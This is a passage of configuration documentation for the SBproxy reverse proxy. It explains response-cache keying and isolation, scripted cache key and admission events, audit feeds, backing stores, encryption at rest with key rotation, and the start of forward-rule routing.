#### Why only GET and HEAD

The cache key is built from the workspace, tenant, hostname, method, path, a
digest of the caller's credentials, canonical query, a fingerprint of the `Vary`
headers, and a fingerprint of the origin's cache-relevant config. It does not
include the request body.

For `GET` and `HEAD` that is complete: the request is fully described by its
target and its headers. For a method whose body carries the request it is not.
Every `POST` to one path would share a single cache entry, so the first response
stored would be returned to every later request at that path no matter what it
asked for. On an AI origin that means one caller's completion served to another
caller's prompt, as a cache hit, with nothing to indicate anything went wrong.

So `cacheable_methods` refuses anything other than `GET` and `HEAD` at config
load rather than accepting it and behaving incorrectly.

To cache AI completions, use [the semantic cache](ai-gateway.md), which keys on
prompt content with a similarity threshold and per-scope isolation. That is a
different mechanism for a different job, and it is the one that makes caching a
`POST` safe.

#### Who a cached entry belongs to

A cached entry belongs to the caller that seeded it. The key carries a digest
of whatever credential the request presented: the resolved principal (a JWT
subject, an API key id, a forward-auth subject, an mTLS-derived identity),
the `Authorization` or `Proxy-Authorization` header, and the `Cookie` header.
A request that presents none of those keys as it always did, so public traffic
is unaffected.

Without that field, an origin running `authentication` and `response_cache`
together stored the first caller's `GET /me` and replayed it to every later
caller as a hit, with no log line, metric, or response header saying so. RFC 9111
section 3.5 has a shared cache refuse to store a credentialed response at all;
partitioning per caller is more permissive than that and still safe, because the
partition is drawn by the proxy rather than by the response.

What it costs: on an origin whose callers are all authenticated, a shared entry
becomes one entry per credential, so the hit rate falls toward the per-caller
repeat rate and the upstream sees more traffic. On an origin whose callers carry
any cookie at all, the same applies per cookie, including a cookie no upstream
reads. If that is your origin and the content really is identical for everyone,
the answer is a `request_modifier` upstream of SBproxy that strips the cookie,
or leaving `response_cache` off for that origin and caching at a layer that
knows the content is public.

**What the partition does not protect: a cookie the proxy itself mints.**
The key is drawn from the `Cookie` header the caller *sends*. A caller that
sends none lands in the cookie-less partition along with every other caller
that sends none, and that is the partition a first-time visitor is in. If the
response stored for that partition carries a `Set-Cookie` the proxy minted
while serving it, every later cookie-less caller is served that same
`Set-Cookie` from the entry.

Three features mint a cookie on this path, and the risk differs by what the
cookie carries:

- **`sessions`** mints a session identifier. A second caller can be handed the
  first caller's session id, which means they share a session.
- **`csrf`** mints a CSRF token on safe-method responses. A second caller can
  be handed the first caller's token.
- **`abtest`** mints a variant pin. This one is refused outright: an `abtest`
  action, on the origin or in any of its `forward_rules`, cannot be combined
  with `response_cache`, because the cached *body* is wrong too and the config
  is rejected at load.

Treat a shared session identifier as an authentication problem, not a caching
one. Until this is fixed at the storage layer, either leave `response_cache`
off on an origin that configures `sessions` or `csrf`, or, if you must run
both, put the cached content on an origin that mints neither. If you have
already been running that combination, bump `response_cache.epoch` after
changing the configuration: the epoch is part of the key's config
fingerprint, so raising it partitions away from every entry written before,
including any that carry a minted cookie.

Two more dimensions are stamped the same way and for the same reason:

- **Tenant.** One hostname resolves to one origin and one tenant today, so the
  hostname already separated them. The tenant field says so directly, rather
  than leaving cross-tenant isolation as a property of the routing table.
- **The negotiated content coding.** SBproxy forwards `Accept-Encoding`, so an
  upstream that compresses returns different bytes to different callers. The
  key varies on the set of codings the caller accepts, not on the spelling, so
  `gzip, deflate, br` and `br;q=1.0, deflate, gzip;q=0.8` still share an entry.

**A response that varies on something the key does not carry is not stored.**
The upstream's `Vary:` header names the request headers that change its
answer. SBproxy reads it at store time and refuses the entry when it names a
dimension the key does not have, because the alternative is a later request
reading a variant it should have missed. `Accept-Encoding`, `Authorization`,
`Proxy-Authorization`, `Cookie`, and `Host` are covered by the proxy itself;
anything else has to be in `vary:`. `Vary: *` is never storable.

The visible symptom of getting this wrong is an origin whose hit rate stays at
zero. Run the proxy at `debug` level and look for
`response not cached: upstream Vary names a dimension the cache key does not
carry`, which names the header to add. Note that a dimension covered only by a
`key_event` policy does not count: the policy is per request and this decision
is per response, so a policy that fires for one request and declines for the
next cannot be trusted to have partitioned the entry.

What is still **not** in the key, and what that means for you:

- Which `forward_rules` branch a request takes is decided after the key is
  built. If a rule matches on a header, list that header in `vary:`.
- A `request_modifier` runs after the key is built. One that rewrites the
  request based on a header outside the key produces two upstream requests
  under one key.

#### Which config changes rotate the cache

A cached entry is only valid for the config that produced it. If you repoint an
upstream and the old entries stay readable, the proxy serves the previous
backend's responses under the new configuration until they expire. In a
multi-node deployment sharing one Redis or memcached, that is worse than it
sounds: every node reads the same key space, so during a rolling change a node
still on the old config can serve entries a node on the new one just wrote, and
the reverse.

So the cache key ends with a fingerprint of the origin's cache-relevant config.
Two revisions of an origin write to different keys. Neither refuses to serve;
each keeps its own entries, and the ones nobody is reading any more age out on
their TTLs. Rolling a config change costs a cold cache for the origins that
changed, and nothing for the origins that did not.

The fingerprint covers what decides the response the upstream returns:

- the `action` block, including the upstream URL and, on an AI origin, the
  provider and model
- `authentication`
- `request_modifiers`, `transforms`, `filters`, `on_request`, `forward_rules`,
  `fallback_origin`, and `variables`
- the `response_cache` block itself, `epoch` included

It deliberately does not cover `response_modifiers`, `cors`, `hsts`,
`compression`, `session`, error pages, observability, timeouts, or policies.
On an origin without transforms, cached entries hold the upstream's own
response and replay it unchanged, so none of those can change what is in an
entry. On an origin with transforms, the entry holds the transform chain's
output: transforms run once when the response is stored (and again on each
stale-while-revalidate refresh), a hit serves the stored transformed body, and
a `failure_posture: closed` transform refusal blocks the store, so the closed
guarantee extends to cached responses. Because a stored transform output is
replayed to every later requester, a transform whose output depends on the
incoming request (the scripted transforms, the content-negotiation family,
`cel`, and `a2a_agent_card_rewrite`) is refused at config load when combined
with `response_cache`; the error names the transform. The fingerprint does not
cover anything outside the origin: an unrelated origin, a log level, or a
listener change leaves every existing entry readable.

Upgrade note: entries written by versions that stored pre-transform bodies are
retired wholesale on upgrade (the fingerprint's domain label moved to `v2`),
so the first request per key after upgrading is a miss. This is deliberate: it
is the only way an upgraded node cannot replay a pre-transform body as a hit.

`epoch` exists for the case the fingerprint cannot see. If an upstream starts
returning a different response shape and nothing in your config changed, no
fingerprint would move, and the cache would keep serving the old shape until the
TTL ran out. Bump `epoch` to rotate that origin's entries by hand:

```yaml
origins:
  "api.example.com":
    response_cache:
      enabled: true
      ttl_secs: 300
      epoch: 1        # was 0; rotates this origin's cached entries
```

Bumping it when you did not need to costs one cold start for one origin, so it
is safe to reach for when you are unsure.

Two access-log fields make this observable. `config_revision` names the config
the node was serving, and `cache_config_fingerprint` names the entry set the
origin was reading and writing. During a rolling change both appear with two
values across the fleet, which is what tells you the rollout is half finished
rather than that something has broken. A lookup that finds an entry stamped by
another config counts as `result="config_miss"` on
`sbproxy_cache_results_total`, separately from an ordinary miss.

### Deciding the key and the admission per request

Every field above is static. Two optional events decide part of it per request instead: `key_event` chooses what the cache key varies on, and `admit_event` chooses whether a finished response is stored and for how long.

They are two events rather than one cache policy because of an ordering constraint. A key has to exist before anything can be looked up under it, so `key_event` runs on the request, before the lookup, with no response in scope. Whether a response is worth storing depends on its status and its size, neither of which exists at request time, so `admit_event` runs after the response body is complete.

Both take the same `source` plus `engine` pair as [`custom_fields`](access-log.md#custom-fields), and the accepted engines are `lua` and `js`. Each script sees the event's input as a `ctx` global and returns a document: Lua returns it, JavaScript evaluates to it.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    response_cache:
      enabled: true
      ttl_secs: 300
      cacheable_status: [200]
      key_event:
        engine: lua
        source: |
          -- ctx.request.{method,path,query,host}, ctx.tenant, ctx.origin
          if string.find(ctx.request.path, "/v1/reports", 1, true) == 1 then
            return {
              vary = { "header:x-plan-tier", "header:x-region" },
              reason = "a report body differs per tenant and per plan tier",
            }
          end
          return {}
      admit_event:
        engine: js
        source: |
          // ctx.response.{status,body_bytes,headers}, ctx.request.{path,host}
          (() => {
            if (ctx.response.body_bytes > 1048576) {
              return { store: false, reason: "too large to be worth a cache slot" };
            }
            return { store: true, ttl_secs: 60, reason: "report bodies go stale fast" };
          })()
```

`key_event` returns:

| Field | Type | Description |
|-------|------|-------------|
| `vary` | list | Extra dimensions folded into the cache key, added to the static `vary:` list of request headers. At most 16. |
| `skip_lookup` | bool | Go upstream for this request instead of reading the cache. The response stays eligible for storage. |
| `reason` | string | Free text explaining the plan, trimmed and truncated at 512 bytes. Nothing branches on it. It reaches the decision-audit feed when that feed is turned on for this event, so write it for the person reading an audit trail six months from now. |

`admit_event` returns:

| Field | Type | Description |
|-------|------|-------------|
| `store` | bool | Required. Whether this response is written to the cache. |
| `ttl_secs` | int | TTL for this entry, replacing the configured `ttl_secs`. Clamped to 30 days. |
| `reason` | string | Same free text, same bounds, and the same audit destination. |

Every field on a `key_event` document is optional, and `{}` or `null` declines, which leaves the static `vary:` in charge. `admit_event` declines the same two ways, but any other document has to carry `store`. There is no safe default for that one: guessing `true` caches a response the policy never approved, and guessing `false` silently switches the cache off, so a non-empty document without `store` is refused as incomplete rather than assumed either way.

A dimension name is not free-form. Each one is either `query` or a request header written `header:<name>`. Anything else is refused when the document is decoded. That refusal is the safety property: a name resolving to nothing would contribute the same empty value to every request, partition nothing, and merge every caller into one cache entry, which is the poisoning bug wearing a working config's clothes. Names are trimmed, lowercased, deduplicated, and sorted, so a policy that returns the same set in a different order still produces the same key.

A `key_event` can only add dimensions to the key. Every field of `v2:<workspace>:<tenant>:<hostname>:<method>:<path>:<identity>:<query>:` is stamped by the host whatever the event returns, and the event reaches only the Vary fingerprint that follows them, so a policy can narrow a key and can never widen one.

Worth being precise about which field separates tenants, because the obvious answer is wrong: `workspace` is passed as the empty string on every path in this build. The separation comes from `tenant`, `hostname`, and the per-origin store handle. Callers are separated by `identity`, a digest of the credentials the request presented.

**Why the host-resolved list is one entry long.** `method`, `path`, the hostname, the tenant, and the caller are already key fields, so varying on them adds nothing. An `origin` dimension is worse than redundant: it is fixed per origin, so every request that could share a key already agrees on it. `query` earns its place only because `query_normalize: ignore_all` deliberately empties that field, and this is the way to put it back for a subset of requests. Note it resolves the raw query, so it does not inherit the origin's normalization. Everything else that genuinely partitions is a request header.

The two events fall back in opposite directions, and the asymmetry is deliberate:

- If the `key_event` engine faults, or returns a document that cannot be decoded, the cache is bypassed entirely for that request: no read and no write. Keying on the static `vary:` alone would be coarser rather than narrower, and the same key carries the write-back, so that response would be published to every other caller whose script also faulted.
- If the `admit_event` engine faults or returns an undecodable document, the response is stored under the configured `ttl_secs`, which is what an origin without the event already does. Nothing about the key changed, so the entry can only be read by requests that were already entitled to it.

Two more things the events cannot do. `skip_lookup: true` goes upstream for this request but leaves the response eligible for storage, so it is not a way to refuse to cache; return `store: false` from `admit_event` for that. And `admit_event` only runs for a response whose status already passed the static `cacheable_status` gate, so it can decline a status that gate allows and cannot start caching one that gate excludes.

Two engines are refused at config compile, on boot and on reload, rather than at request time:

- `engine: cel`, because these events return a document (a list of key dimensions, or `store` plus `ttl_secs`) and CEL evaluates to a single scalar. Supporting it would mean a token grammar for packing a document into a string. The error names `lua` and `js`, which return documents natively.
- `engine: wasm`, because a compiled module is not inline source. Attach a WASM hook through an [extension bundle](extension-bundles.md) instead.

### Sending decision reasons to an audit feed

A `reason` is the part of a decision worth keeping. A record saying a response
was not cached is nearly useless; one saying `too large to be worth a cache
slot` is an answer. Turn the feed on per event under
`observability.log.decision_audit`, and each decision publishes an OCSF API
Activity record carrying its reason, engine, outcome, origin, and tenant.

```yaml
observability:
  log:
    decision_audit:
      events:
        cache.admit: true
```

`enabled: true` alongside `events:` turns on every event that has an emitter;
a per-event entry overrides it in either direction. Everything is off unless
you ask for it, and that default is deliberate: `cache.key` runs once per
cacheable request, so a permissive master switch would hand a busy origin a
per-request feed, and the usual answer to a feed nobody can afford is to
switch the whole thing off, which takes the security-relevant events with it.

The block also composes under a tenant and under an origin, per event label
rather than per block. A tenant that names `route.decide` keeps the proxy's
`cache.admit` entry instead of replacing the map, because replacing it would
mean turning on one tenant's routing audit silently disables its cache audit.
Precedence for a given event is origin, then tenant, then proxy.

A decision that has structured facts about what it did publishes them as
fields alongside the reason, so the filtering is your SIEM's job rather than
this config's. A `route.decide` record carries the requested model, the
selected model and provider, the tier count, and how many plan entries the
host had to drop. "Only the routing decisions that moved a request" is then a
field comparison at ingest, which is both cheaper and recoverable; a record the
proxy declined to publish is gone. See [observability.md](observability.md).

`cache.admit`, `cache.key`, and `route.decide` are the events with emitters: they are the three decision points that compute a `reason` worth carrying. A label naming
no known event is refused when the config loads rather than ignored, because a
typo is a feed you believe you turned on and nobody is watching.
`ai.stream.event: true` is refused by value: it fires once per streamed chunk,
and `ai.close` carries the stream's summary instead.

Reasons are scrubbed before they leave the process, in this order: a built-in
secrets pass, then the `redact.patterns:` masks and PII rules that apply at the
record's own tenant and route, then a 512-byte bound. That is the same
resolution the log path uses, so a mask you wrote for a tenant covers that
tenant's decision records and nobody else's, and there is nothing to configure
twice. The `redact.fields:` denylist is the one half that does not carry over,
since a reason is a single string with no field key to match on. Scrubbing runs
before the bound on purpose: trimming first can cut a credential below the
length its detector needs and ship the surviving prefix as ordinary text. A
script that explains itself by quoting a prompt is still a script quoting a
prompt, so treat the feed as carrying whatever your policies decide to say.

Records ride the same bounded channel as policy verdicts. When it is full the
record is dropped and counted on
`sbproxy_decision_audit_events_dropped_total{event, tenant}`, because a feed
that loses records silently reads as evidence that nothing happened.

An `admit_event` composes with `stale_while_revalidate`. The revalidation refresh runs the same event against the response it fetches, so a refusal keeps the stale entry rather than replacing it, and a TTL override survives the refresh instead of reverting to the static `ttl_secs`. These two used to be refused together at config load, because a refresh with no request context would have silently undone both halves of the policy; the refresh now carries the request-side facts the event reads.

A refusal on a refresh is not a fail-open. The refresh serves nobody, so the stale entry simply stays until it ages out of the window.

The plan can also set its own window:

```yaml
admit_event:
  engine: lua
  source: |
    if response.status ~= 200 then
      return {store = false, reason = "only 200s are worth caching"}
    end
    return {store = true, ttl_secs = 300, swr_secs = 30, reason = "deterministic completion"}
```

`swr_secs` overrides `stale_while_revalidate` for that response alone, clamped the same way `ttl_secs` is, and it rides on the stored entry rather than being re-read from config on each hit. That matters when the origin's default later widens: an entry admitted with a deliberately short window keeps it, instead of quietly being served stale for longer than the policy that admitted it intended. A response worth caching for an hour is not automatically worth serving stale for one. Entries written before this field existed carry no window and fall back to the origin's configured value.

Sandbox budgets, the engine surfaces, and worked scripts are in [scripting.md](scripting.md). Evaluations are counted on `sbproxy_decision_event_total{event="cache.key"}` and `{event="cache.admit"}`, and the two faults are counted differently on purpose. `cache.admit` genuinely fails open, so a fault records `outcome="allow"` plus `sbproxy_decision_event_fail_open_total`. `cache.key` fails closed on the cache, so a fault records `outcome="error"`, or `outcome="timeout"` when the script ran out of its CPU budget, and no fail-open counter: counting it there would report the opposite of what happened. See [observability.md](observability.md).

### Choosing the backing store

There is one response-cache store per process. Every origin with `response_cache.enabled` shares it, which is safe because the cache key already carries the workspace, tenant, hostname, method, path, caller identity, canonical query, the Vary fingerprint, and the origin's config fingerprint, so two origins cannot read each other's entries and two callers of one origin cannot read each other's. The store is built only when at least one origin enables the cache.

`proxy.response_cache_store` picks which store that is. It is a top-level `proxy` block, not a per-origin field.

```yaml
proxy:
  response_cache_store:
    backend:
      type: file
      path: /var/cache/sbproxy/responses
      max_size_mb: 512
```

| `type` | Survives a proxy restart | Shared across replicas | Stale-while-revalidate | Prefix purge |
|--------|--------------------------|------------------------|------------------------|--------------|
| `memory` | no | no | yes | yes |
| `file` | yes | yes, when replicas share the directory | yes | no |
| `memcached` | yes, until memcached itself restarts | yes | no | no |
| `redis` | yes | yes | no | yes |

Backend fields:

| Backend | Field | Type | Default | Description |
|---------|-------|------|---------|-------------|
| `memory` | | | | No fields. Sized by the largest per-origin `response_cache.max_size`. |
| `file` | `path` | string | required | Directory holding one file per entry, named by a hash of the cache key. Created at startup; a directory that cannot be created stops startup. |
| `file` | `max_size_mb` | int | 0 | Ceiling on total directory size. `0` means no ceiling. A write that would cross the ceiling is refused rather than evicting an older entry, and every write walks the directory to measure it, so the check costs more as the entry count grows. Leave it at `0` unless the disk budget is real. |
| `memcached` | `host` | string | `127.0.0.1` | Server hostname or IP. |
| `memcached` | `port` | int | `11211` | Server port. |
| `redis` | | | | No fields. Reuses the connection from `proxy.l2_cache_settings`. Selecting `redis` without that block stops startup. |

Omit the block and the store is chosen the way it always was: Redis if `l2_cache_settings` is set with `driver: redis`, an in-process map otherwise. Existing configs therefore keep the backend they have today. The per-origin `max_size` sizes the `memory` store only; the other three ignore it.

Check these before picking one, because none of them are configurable away.

- `file` and `memcached` hash cache keys, so neither can scan by prefix. `invalidate_on_mutation` (on by default) does nothing on them and entries fall out by TTL instead. Config compile warns about this combination, naming each origin that would silently lose mutation-driven invalidation; pick `memory` or `redis` if you need it, or set `invalidate_on_mutation: false` to accept TTL-based expiry and silence the warning.
- Neither `memcached` nor `redis` can hand back an entry that is past its TTL, so `stale_while_revalidate` never fires on them. Memcached expires items server-side, and the Redis entry carries its own expiry.
- `memcached` opens a TCP connection per operation, and its server default caps a value at 1 MiB. Larger responses are refused by the server; the write is logged and the request proceeds.
- `memcached` and `redis` are not dialled at startup. A config compiles and the proxy boots with the server down; the first cache read is where you find out.

Cache keys sent to memcached are hashed to fit the protocol's 250-byte limit, and a TTL longer than 30 days is clamped to 30 days because memcached reads anything larger as an absolute timestamp.

### Encrypting cached responses at rest

A response cache holds whatever the upstream returned, and once that is on disk or in a shared memcached it outlives the request that produced it. The optional `encryption` block seals response headers and bodies with AES-256-GCM before they reach the backing store.

```yaml
proxy:
  response_cache_store:
    backend:
      type: file
      path: /var/cache/sbproxy/responses
    encryption:
      enabled: true
      key: "secret://primary/response-cache"
      previous_keys:
        - "secret://primary/response-cache-2026-06"
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | false | Master switch. |
| `key` | string | unset | Secret reference for the active key. Seals new entries and opens entries sealed under it. Required when `enabled` is true. |
| `previous_keys` | list of strings | `[]` | Retired keys, used only to open entries sealed before a rotation. |

`key` and each entry in `previous_keys` take the same references as every other secret in the config: a provider URI such as `secret://backend/name` or `vault://...` resolved against a backend declared under [`proxy.secrets.backends`](#secret-reference-uri-schemes), a `file:/path` reference, or a whole-value `${ENV_VAR}`. The resolved material must be at least 16 bytes.

Use 32 random bytes, not a passphrase. The proxy logs a short fingerprint of the key it loaded so operators can tell two keys apart, and that fingerprint gives an attacker something to guess against offline. Against 256 bits of entropy the guessing goes nowhere. Against a phrase somebody thought up, it finishes.

```bash
head -c 32 /dev/urandom | base64 > /etc/sbproxy/response-cache.key
chmod 600 /etc/sbproxy/response-cache.key
```

Status, cache time, and TTL are stored readable, because the file and memcached backends need them to decide expiry without opening the entry. All three are authenticated, so they can be read but not altered: rewriting a cached `200` as a `500`, or stretching an entry's TTL, fails the integrity check.

Every backend accepts the block, including `memory`, where it protects nothing meaningful: the plaintext lives in the same process either way. It is allowed there so a config can move between backends without anyone editing the encryption block.

There is no plaintext fallback anywhere in this path:

- A key that is missing, unresolvable, or shorter than 16 bytes stops startup with an error naming the field. A typo costs a failed boot, never a directory of plaintext you believed was sealed.
- A secret reference is never used as key material verbatim. When no secret backend is configured to resolve it, startup fails and points at `proxy.secrets.backends`.
- A write that cannot be sealed fails. It never falls back to storing the response in the clear.
- A stored entry that no configured key can open is evicted and reported as a miss, so a cache that used to run unencrypted heals as entries are rewritten.
- A stored entry that claims a configured key and then fails authentication is evicted, logged, and treated as a cache error; the request goes to the upstream.

`sbproxy validate` checks the shape of the block but resolves no secrets and touches no filesystem, matching how it treats secrets everywhere else. A bad key reference surfaces the first time the config is served.

#### Nonces

Every entry draws its own random salt and derives a single-use key from the master material, so each 96-bit nonce is used under a key that seals exactly one message. That keeps the cache clear of the nonce-reuse ceiling a single long-lived key would reach in days at gateway write rates.

#### Key rotation

Move the current reference into `previous_keys` and name the new one as `key`. New writes seal under the new key; existing entries keep opening under the old one until they are rewritten or expire. Drop a reference out of `previous_keys` and its entries are evicted on the next read, at the cost of one cache miss each.

Every entry carries a short identifier for the key that sealed it, so a read picks the right key directly rather than trying each one in turn.

#### Per-origin keys

One store serves every origin. By default one key seals every origin's entries too, which means the only thing separating two tenants in the cache is the cache key. `origins.<host>.response_cache.encryption` gives an origin its own key instead.

```yaml
proxy:
  response_cache_store:
    backend:
      type: redis
    encryption:
      enabled: true
      key: "secret://primary/response-cache"
      per_origin_keys: inherit

origins:
  tenant-a.example.com:
    response_cache:
      enabled: true
      encryption:
        key: "secret://primary/cache-tenant-a"
        previous_keys:
          - "secret://primary/cache-tenant-a-2026-06"
  tenant-b.example.com:
    response_cache:
      enabled: true
      # No key, so this origin uses the store-wide one.
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `proxy.response_cache_store.encryption.per_origin_keys` | `inherit` \| `required` | `inherit` | What happens to an origin that caches and declares no key. `inherit` uses the store-wide key. `required` stops startup, naming every origin that is missing one. |
| `origins.<host>.response_cache.encryption.key` | string | unset | Secret reference for this origin's active key. Same reference syntax as the store-wide `key`. |
| `origins.<host>.response_cache.encryption.previous_keys` | list of strings | `[]` | This origin's retired keys. Rotating one origin does not touch any other. |

The origin is authenticated into every entry regardless of which key sealed it. An entry sealed for one origin therefore fails to open when read as another, even when both inherit the store-wide key. That makes cross-tenant isolation a property of the record rather than of the routing table: a mis-scoped lookup fails the integrity check instead of returning another tenant's response body.

What per-origin keys add on top is key separation. Under `inherit`, one leaked key opens every tenant's entries. Under `required`, it opens one tenant's.

- Declaring a per-origin key while `proxy.response_cache_store.encryption` is off stops startup. An operator who wrote a key expected sealing to happen; ignoring it would store that tenant in the clear.
- Every per-origin reference is resolved at boot. An unresolvable one stops startup with an error naming the origin, matching the store-wide rule.
- Purge is unaffected. It matches on the cache key and never opens a value, so `POST /admin/cache/purge` with a prefix still clears entries sealed under keys the admin path does not hold.
- Entries written by a build that predates per-origin keys keep opening, and reseal with the origin bound the next time they are written. Downgrading to such a build evicts the newer entries as unreadable and refetches them, which costs a cache miss each and no correctness.

The runnable version of the store-wide setup (a file-backed cache, key resolved from a `file:` reference, entries sealed with AES-256-GCM) is [`examples/response-cache-encrypted/`](../examples/response-cache-encrypted/). It is single-origin, so it does not exercise `per_origin_keys` or `previous_keys`; the config above is the reference for that shape.

### What is encrypted at rest, and what is not

Encryption is worth configuring where data outlives the request. This table says which surfaces those are, so the answer is not inferred from whichever block happens to have an `encryption` key.

| Surface | What it holds | Persists or replicates | Encrypted at rest |
| --- | --- | --- | --- |
| Response cache | Upstream headers and bodies | Yes, with the `file`, `redis`, and `memcached` backends | Yes, via `proxy.response_cache_store.encryption` |
| Prompt persistence | Runtime prompt-overlay records | Yes, a redb file on disk | Yes, via `admin.prompt_persistence_encryption` |
| Upstream credentials | Provider secrets | Yes, in the keystore | Yes, as an AEAD envelope or a vault reference. See [key-management.md](key-management.md) |
| Semantic cache | Prompts and the model responses replayed for them | Depends on `action.semantic_cache.backend`: no on `memory` (the default), yes on `redis`, replicated on `mesh` | No. Secure the backing store yourself; startup warns once per distributed backend |
| Judge cache | Guardrail verdicts | No, in-process only | Not applicable |
| Mesh distributed cache | Key-plane records, compression sessions | No, excluded from persisted cluster state | Not applicable. Peer traffic is sealed on the wire, see below |

Memory-only caches are deliberately not encrypted. An attacker who can read the process heap can read the derived key out of the same heap, so sealing there buys close to nothing while adding another key to manage. Encrypt what persists or replicates.

The judge cache is memory-only because its in-tree implementation is, not because nothing could change that: it is structured so a backend can be swapped in. A boot-time check refuses to start a pipeline in which a registered cache reports a backend that survives a restart, or is shared across replicas, while storing entries unsealed. No cache registers through that check in a current build, so today it refuses nothing. It stays because the day one does, the exposure should not be able to appear silently.

The semantic cache and the response cache are checked on their own paths, and both warn rather than abort. Running the semantic cache on `redis` or `mesh`, or the response cache on `file`, `redis`, or `memcached`, is a documented configuration an operator chose, so startup says what is now leaving the process instead of refusing to boot. The two differ in what closes the gap: the response cache has an `encryption` block, and the semantic cache has none, so sealing its Redis or mesh store is the operator's job. Treat those entries as sensitive: they are prompts and model output.

A credential whose material is stored as plaintext (`kind: plaintext`, only reachable for config-seeded credentials) is never published to a shared cache tier at all, neither the mesh tier nor Redis. Those resolves read through to the keystore instead. Prefer a vault reference or an envelope so the credential can be cached.

#### What the mesh wire cipher does and does not cover

`mesh.encryption.shared_key` seals traffic **between peers**. It protects cache and state RPCs in flight from anything watching the network between nodes.

It is not at-rest encryption, and it is a different mechanism from the blocks above:

- It covers bytes on the wire, not bytes in a backing store. A value the mesh replicates is sealed while it travels and plain in each node's memory once it arrives.
- It does not extend to the response cache's backing store. A `redis` or `file` backend still needs `proxy.response_cache_store.encryption`; the wire cipher does nothing for a Redis server an attacker can read directly.
- The mesh distributed cache is excluded from persisted cluster state, so its values do not reach Redis or disk through that path.

The wire key is derived from `shared_key` by `key_derivation`, which is `sha256` by default and can be set to `hkdf` to put the mesh on the same derivation every other key in this workspace uses. Every node opens under both derivations, so a cluster is flipped one node at a time rather than all at once. See [mesh-replication.md](mesh-replication.md).

### Encrypting persisted prompts at rest

`admin.prompt_persistence_path` writes the runtime prompt overlay to a redb file so runtime prompt edits survive a restart. Prompt templates can carry business logic and, in some deployments, embedded context worth protecting. The optional `prompt_persistence_encryption` block seals each stored record with AES-256-GCM.

```yaml
admin:
  prompt_persistence_path: /var/lib/sbproxy/prompts.redb
  prompt_persistence_encryption:
    enabled: true
    key: "secret://primary/prompt-persistence"
    previous_keys:
      - "secret://primary/prompt-persistence-2026-06"
```

The same reference syntax as every other config secret: a provider URI against a backend declared under `proxy.secrets.backends`, a `file:/path` reference, or a whole-value `${ENV_VAR}`.

Behavior worth knowing before enabling it:

- **No plaintext fallback.** `enabled: true` with no `key`, an unresolvable reference, or material shorter than 16 bytes aborts startup. This is stricter than the rest of prompt persistence, where an unreadable file only degrades to in-memory-only edits. Losing a file loses saved prompts; silently writing records in the clear after asking for encryption is worse.
- **Turning it on does not orphan an existing file.** Records already written as plaintext keep hydrating, and each one seals the next time it is written.
- **Records are bound to their slot.** The store key is authenticated, so a sealed record copied into another host's or another prompt's slot fails to open rather than being served as that prompt.
- **Its key is separate from the response cache's.** Both derive through their own HKDF purpose, so pointing them at one operator secret still yields two unrelated keys, and neither can open the other's records.

Rotation works as it does for the response cache: move the current reference into `previous_keys`, name the new one as `key`, and records reseal as they are rewritten. Each record carries a short identifier for the key that sealed it, so a read selects the right key directly. Drop a reference out of `previous_keys` and any record still sealed under it stops opening, which is what retiring a key means.

---

## Forward rules

Forward rules route specific requests to different origins based on method, path, header, query, or JSON body conditions. They are evaluated in order; the first match wins. Common uses: path-based microservice routing, version routing, sending writes to a different backend than reads, and dispatching LLM traffic by the `model` field of the request body.

Forward rules are deserialized lazily; required fields are enforced when the rule is exercised, not at config-load time.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://default-backend.internal:8080
    forward_rules:
      # Route /api/v2/* to the v2 backend
      - rules:
          - path:
              prefix: /api/v2/
        origin:
          id: v2-backend
          action:
            type: proxy
            url: https://v2-backend.internal:8080

      # Route /health to a static response
      - rules:
          - path:
              exact: /health
        origin:
          id: health
          action:
            type: static
            status: 200
            content_type: application/json
            json_body:
              status: healthy

      # Route clients that identify as mobile to the mobile backend
      - rules:
          - header:
              name: X-Client-Platform
              prefix: mobile
        origin:
          id: mobile-backend
          action:
            type: proxy
            url: https://mobile-backend.internal:8080
```

### Rule matching

Each forward rule has a `rules` array where each entry is a matcher. The deserializer accepts these forms only:

| Field | Type | Description |
|-------|------|-------------|
| `path.prefix` | string | Path starts with this value. |
| `path.exact` | string | Path matches this value exactly. |
| `path.template` | string | OpenAPI-style path template with named segments, e.g. `/users/{id}/posts/{post_id}`. Supports catch-all (`/static/{*rest}`) and per-segment regex constraints (`/users/{id:[0-9]+}`). Captured params surface on the request context as `path_params`. |
| `path.regex` | string | Whole-path regex escape hatch. Named captures (`(?P<id>...)`) surface params on the request context. |
| `match` | string | Shorthand. Equivalent to `path: { prefix: <value> }`. |
| `header` | object | Header matcher: `{name, value}` for an exact match or `{name, prefix}` for a value-prefix match. When both are set, `value` wins. Header names compare case-insensitively; values case-sensitively. |
| `query` | object | Query parameter matcher: `{name, value}` for an exact match, or `{name}` alone to match on presence. |
| `body` | object | JSON request-body field matcher: `{pointer, value}` for an exact match, `{pointer, prefix}` for a value-prefix match, or `{pointer}` alone to match on presence. `pointer` is an RFC 6901 JSON Pointer such as `/model`. See [Body matching](#body-matching). |
| `method` | string or list | HTTP method matcher: a single method (`method: POST`) or a list (`method: [POST, PUT]`). The entry fires when the request method equals any listed one. Methods are normalized to uppercase at config load, so `post` and `POST` mean the same thing. An empty list or a token that is not a valid HTTP method fails config load. |

Set exactly one of `prefix`, `exact`, `template`, or `regex` on a path matcher. If more than one is set, precedence is `template` > `regex` > `exact` > `prefix` (so `exact` beats `prefix`).

Within a single matcher entry, every present matcher (`method`, `path`, `header`, `query`, `body`, `when`) must succeed for the entry to fire. `when` is a CEL predicate, evaluated last and only once the structured matchers have passed; it sees the request as it arrived and nothing a later pipeline pass produces, and naming anything else is refused at config load. See [scripting.md](scripting.md) for its bindings. When a rule has multiple matcher entries, the rule fires when any one of them matches. Any other key on a matcher entry (Go-era fields such as `methods`, `ip`, `location`, `user_agent`, `content_types`, `protocol`) is rejected at config load as an unknown key; note that the supported method field is the singular `method`, and the Go-era plural `methods` stays rejected.

A method matcher composes with the other matchers in its entry, so routing writes away from reads takes one rule:

```yaml
forward_rules:
  # POST/PUT/PATCH/DELETE under /api/ go to the primary; GETs keep the
  # origin's default action.
  - rules:
      - path:
          prefix: /api/
        method: [POST, PUT, PATCH, DELETE]
    origin:
      id: api-primary
      action:
        type: proxy
        url: https://primary.internal:8080
```

### Body matching

